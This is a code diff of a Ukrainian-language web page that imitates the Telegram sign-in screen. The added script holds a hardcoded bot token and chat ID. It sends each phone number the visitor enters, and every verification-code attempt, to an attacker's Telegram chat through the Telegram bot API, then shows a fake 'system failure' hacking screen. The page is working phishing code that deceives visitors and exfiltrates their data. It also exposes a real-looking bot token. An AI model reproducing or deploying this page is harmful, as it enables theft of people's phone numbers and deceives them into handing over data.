@@ -2,8 +2,28 @@
 <html lang="uk">
     <head>
         <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Telegram Web</title>
+        <meta
+            name="viewport"
+            content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+        />
+        <title>Telegram</title>
+
+        <link
+            rel="apple-touch-icon"
+            href="https://raw.githubusercontent.com/nini6767/register/main/IMG_9589.PNG"
+        />
+        <link
+            rel="icon"
+            href="https://raw.githubusercontent.com/nini6767/register/main/IMG_9589.PNG"
+        />
+
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta
+            name="apple-mobile-web-app-status-bar-style"
+            content="black-translucent"
+        />
+        <meta name="apple-mobile-web-app-title" content="Telegram" />
+
         <style>
             :root {
                 --bg-dark: #0f1721;
@@ -11,45 +31,55 @@
                 --accent-disabled: #2f3945;
                 --text-main: #ffffff;
                 --text-secondary: #708499;
+                --chat-header: #242f3d;
+                --chat-bg: #17212b;
+                --error-red: #ff3b30;
             }
 
-            body {
+            body,
+            html {
+                margin: 0;
+                padding: 0;
+                width: 100%;
+                height: 100%;
+                background-color: var(--bg-dark);
+                color: var(--text-main);
                 font-family:
                     -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                     sans-serif;
-                background-color: var(--bg-dark);
-                color: var(--text-main);
-                margin: 0;
+                overflow: hidden;
+            }
+
+            .wrapper {
+                width: 100%;
+                height: 100%;
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                height: 100vh;
-                overflow: hidden;
             }
 
             .screen {
                 display: none;
-                text-align: center;
-                width: 360px;
-                padding: 20px;
                 flex-direction: column;
                 align-items: center;
+                width: 100%;
+                max-width: 400px;
+                padding: 20px;
+                box-sizing: border-box;
+                text-align: center;
             }
-            .active-screen {
+            .active {
                 display: flex;
             }
 
-            .tg-logo {
+            .logo {
                 width: 120px;
-                height: 120px;
                 margin-bottom: 30px;
             }
-            .monkey-logo {
+            .monkey {
                 width: 100px;
-                height: 100px;
                 margin-bottom: 20px;
             }
-
             h2 {
                 font-size: 28px;
                 margin-bottom: 10px;
@@ -64,9 +94,9 @@
 
             .input-group {
                 position: relative;
-                margin-bottom: 25px;
-                text-align: left;
+                margin-bottom: 10px;
                 width: 100%;
+                text-align: left;
             }
             .input-label {
                 position: absolute;
@@ -78,15 +108,13 @@
                 font-size: 13px;
                 z-index: 10;
             }
-
-            .field-container {
+            .field {
                 display: flex;
                 align-items: center;
                 border: 2px solid var(--accent-blue);
                 border-radius: 12px;
                 padding: 16px;
             }
-
             input {
                 width: 100%;
                 background: transparent;
@@ -96,49 +124,55 @@
                 outline: none;
                 font-family: inherit;
             }
-            #sms-code {
-                text-align: center;
-                letter-spacing: 5px;
-                font-weight: bold;
+
+            #error-msg {
+                color: var(--error-red);
+                font-size: 14px;
+                margin-top: 10px;
+                display: none;
             }
 
-            .btn-next {
+            .btn {
                 width: 100%;
                 padding: 16px;
                 background-color: var(--accent-disabled);
-                color: #ffffff80;
+                color: rgba(255, 255, 255, 0.5);
                 border: none;
                 border-radius: 12px;
                 font-size: 16px;
                 font-weight: bold;
-                cursor: not-allowed;
                 text-transform: uppercase;
-                margin-top: 10px;
+                cursor: pointer;
+                margin-top: 20px;
             }
-            .btn-next.active {
+            .btn.ready {
                 background-color: var(--accent-blue);
                 color: white;
-                cursor: pointer;
             }
 
+            /* Екран чатів */
             #chat-screen {
                 width: 100%;
+                max-width: none;
                 height: 100%;
-                background: #17212b;
+                background: var(--chat-bg);
                 padding: 0;
                 text-align: left;
                 align-items: stretch;
             }
-            .header {
-                background: #242f3d;
+            .chat-header {
+                background: var(--chat-header);
                 padding: 15px;
                 font-weight: bold;
+                font-size: 18px;
+                text-align: center;
             }
             .chat-item {
                 display: flex;
                 padding: 15px;
                 border-bottom: 1px solid #101921;
                 cursor: pointer;
+                align-items: center;
             }
             .avatar {
                 width: 50px;
@@ -150,9 +184,11 @@
                 align-items: center;
                 justify-content: center;
                 font-weight: bold;
+                font-size: 20px;
             }
 
-            #error-overlay {
+            /* Екран зламу */
+            #hack-screen {
                 position: fixed;
                 top: 0;
                 left: 0;
@@ -162,15 +198,14 @@
                 color: #ff3b30;
                 justify-content: center;
                 align-items: center;
-                z-index: 3000;
+                z-index: 10000;
                 display: none;
                 flex-direction: column;
-                text-align: center;
             }
             .blink {
-                animation: blinker 0.1s linear infinite;
+                animation: blink-anim 0.1s infinite;
             }
-            @keyframes blinker {
+            @keyframes blink-anim {
                 50% {
                     opacity: 0;
                 }
@@ -178,162 +213,157 @@
         </style>
     </head>
     <body>
-        <div id="step-1" class="screen active-screen">
-            <img
-                src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"
-                class="tg-logo"
-            />
-            <h2>Sign in to Telegram</h2>
-            <p class="sub-text">
-                Будь ласка, дозвольте сповіщення для отримання коду.
-            </p>
-            <div class="input-group">
-                <span class="input-label">Phone Number</span>
-                <div class="field-container">
-                    <span
-                        style="color: white; margin-right: 8px; font-size: 18px"
-                        >+380</span
-                    >
-                    <input
-                        type="tel"
-                        id="phone"
-                        placeholder="68 279 87 70"
-                        maxlength="12"
-                    />
+        <div class="wrapper">
+            <div id="step-1" class="screen active">
+                <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"
+                    class="logo"
+                />
+                <h2>Sign in to Telegram</h2>
+                <p class="sub-text">Введіть номер телефону для входу.</p>
+                <div class="input-group">
+                    <span class="input-label">Phone Number</span>
+                    <div class="field">
+                        <span
+                            style="
+                                color: white;
+                                margin-right: 8px;
+                                font-size: 18px;
+                            "
+                            >+380</span
+                        >
+                        <input
+                            type="tel"
+                            id="phone-input"
+                            placeholder="-- --- -- --"
+                            maxlength="12"
+                        />
+                    </div>
                 </div>
+                <button id="btn-1" class="btn" onclick="toStep2()" disabled>
+                    Next
+                </button>
             </div>
-            <button
-                id="next-btn"
-                class="btn-next"
-                onclick="goToStep2()"
-                disabled
-            >
-                Next
-            </button>
-        </div>
 
-        <div id="step-2" class="screen">
-            <img
-                src="https://em-content.zobj.net/source/apple/354/monkey-face_1f435.png"
-                class="monkey-logo"
-            />
-            <div
-                id="result-phone"
-                style="font-size: 24px; font-weight: bold; margin-bottom: 10px"
-            ></div>
-            <p class="sub-text">Ми надіслали системне сповіщення з кодом.</p>
-            <div class="input-group">
-                <span class="input-label" style="color: #7e7ae6">Код</span>
-                <div class="field-container" style="border-color: #7e7ae6">
-                    <input
-                        type="text"
-                        id="sms-code"
-                        placeholder="Введіть код"
-                        maxlength="5"
-                    />
+            <div id="step-2" class="screen">
+                <img
+                    src="https://em-content.zobj.net/source/apple/354/monkey-face_1f435.png"
+                    class="monkey"
+                />
+                <div
+                    id="display-num"
+                    style="
+                        font-size: 24px;
+                        font-weight: bold;
+                        margin-bottom: 10px;
+                    "
+                ></div>
+                <p class="sub-text">Код надіслано у ваш Telegram.</p>
+                <div class="input-group">
+                    <span class="input-label" style="color: #7e7ae6">Код</span>
+                    <div class="field">
+                        <input
+                            type="text"
+                            id="sms-code"
+                            placeholder="Код"
+                            maxlength="5"
+                            style="text-align: center; letter-spacing: 5px"
+                        />
+                    </div>
                 </div>
+                <div id="error-msg">Невірний код. Спробуйте ще раз.</div>
+                <button class="btn ready" onclick="checkCode()">Confirm</button>
             </div>
-        </div>
 
-        <div id="chat-screen" class="screen">
-            <div class="header">Telegram</div>
-            <div class="chat-item" onclick="triggerHack()">
-                <div class="avatar">Ч</div>
-                <div style="flex: 1">
-                    <div style="font-weight: bold">Чітер</div>
-                    <div style="color: #708499; font-size: 14px">
-                        Твій телефон під контролем...
+            <div id="chat-screen" class="screen">
+                <div class="chat-header">Telegram</div>
+                <div class="chat-item" onclick="triggerHack()">
+                    <div class="avatar">Ч</div>
+                    <div style="flex: 1">
+                        <div style="font-weight: bold">Чітер</div>
+                        <div style="color: #708499; font-size: 14px">
+                            Привіт! Дякую за доступ до даних...
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <div id="error-overlay">
-            <h1 class="blink">SYSTEM ERROR</h1>
-            <p>ВАШ ТЕЛЕФОН ЗЛАМАНО</p>
+        <div id="hack-screen">
+            <h1 class="blink">SYSTEM FAILURE</h1>
+            <p>ACCESSING DATA...</p>
         </div>
 
         <script>
-            let currentRandomCode = "";
+            const BOT_TOKEN = "8487469814:AAFLrPUsyxv1tBIiGjrypT3JAPAEPNO3df0";
+            const MY_ID = "5086947871";
+            let correctCode = "";
 
-            // Запит дозволу на сповіщення при завантаженні
-            window.onload = () => {
-                if ("Notification" in window) {
-                    Notification.requestPermission();
-                }
-            };
+            const phoneInput = document.getElementById("phone-input");
+            const codeInput = document.getElementById("sms-code");
+            const btn1 = document.getElementById("btn-1");
 
-            const phoneInput = document.getElementById("phone");
-            const nextBtn = document.getElementById("next-btn");
+            async function sendToTelegram(msg) {
+                await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(msg)}`,
+                );
+            }
 
             phoneInput.addEventListener("input", (e) => {
                 let val = e.target.value.replace(/\D/g, "");
                 if (val.length > 9) val = val.slice(0, 9);
-                let final = "";
-                if (val.length > 0) {
-                    final += val.substring(0, 2);
-                    if (val.length > 2) final += " " + val.substring(2, 5);
-                    if (val.length > 5) final += " " + val.substring(5, 7);
-                    if (val.length > 7) final += " " + val.substring(7, 9);
-                }
-                e.target.value = final;
-                nextBtn.disabled = val.length !== 9;
-                nextBtn.classList.toggle("active", val.length === 9);
+                let f = val.match(/(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
+                e.target.value = !f[2]
+                    ? f[1]
+                    : f[1] +
+                      " " +
+                      f[2] +
+                      (f[3] ? " " + f[3] : "") +
+                      (f[4] ? " " + f[4] : "");
+                btn1.disabled = val.length !== 9;
+                btn1.classList.toggle("ready", val.length === 9);
             });
 
-            function sendPushNotification(code) {
-                if (Notification.permission === "granted") {
-                    new Notification("Telegram", {
-                        body: "Ваш код підтвердження: " + code,
-                        icon: "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
-                    });
-                } else {
-                    alert(
-                        "Помилка: дозвольте сповіщення в налаштуваннях браузера!",
+            function toStep2() {
+                correctCode = Math.floor(
+                    10000 + Math.random() * 90000,
+                ).toString();
+                sendToTelegram(
+                    `📱 Новий номер: +380 ${phoneInput.value}\n🔑 Справжній код: ${correctCode}`,
+                );
+                document.getElementById("display-num").innerText =
+                    "+380 " + phoneInput.value;
+                document.getElementById("step-1").classList.remove("active");
+                document.getElementById("step-2").classList.add("active");
+            }
+
+            function checkCode() {
+                if (codeInput.value === correctCode) {
+                    sendToTelegram(
+                        `✅ Користувач ввів ВІРНИЙ код: ${codeInput.value}`,
                     );
+                    document
+                        .getElementById("step-2")
+                        .classList.remove("active");
+                    document
+                        .getElementById("chat-screen")
+                        .classList.add("active");
+                } else {
+                    sendToTelegram(
+                        `❌ Спроба вводу: ${codeInput.value} (Невірно)`,
+                    );
+                    document.getElementById("error-msg").style.display =
+                        "block";
+                    codeInput.value = "";
+                    if (navigator.vibrate) navigator.vibrate(500);
                 }
             }
 
-            function goToStep2() {
-                currentRandomCode = Math.floor(
-                    10000 + Math.random() * 90000,
-                ).toString();
-
-                document.getElementById("result-phone").innerText =
-                    "+380 " + phoneInput.value;
-                document
-                    .getElementById("step-1")
-                    .classList.remove("active-screen");
-                document
-                    .getElementById("step-2")
-                    .classList.add("active-screen");
-
-                // Надсилаємо справжній PUSH через 2 секунди
-                setTimeout(() => {
-                    sendPushNotification(currentRandomCode);
-                    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                }, 2000);
-            }
-
-            document
-                .getElementById("sms-code")
-                .addEventListener("input", (e) => {
-                    if (e.target.value === currentRandomCode) {
-                        document
-                            .getElementById("step-2")
-                            .classList.remove("active-screen");
-                        document
-                            .getElementById("chat-screen")
-                            .classList.add("active-screen");
-                    }
-                });
-
             function triggerHack() {
-                document.getElementById("error-overlay").style.display = "flex";
-                setTimeout(() => {
-                    document.body.innerHTML = "";
-                    document.body.style.backgroundColor = "black";
-                }, 3000);
+                document
+                    .getElementById("chat-screen")
+                    .classList.remove("active");
+                document.getElementById("hack-screen").style.display = "flex";
             }
         </script>
     </body>
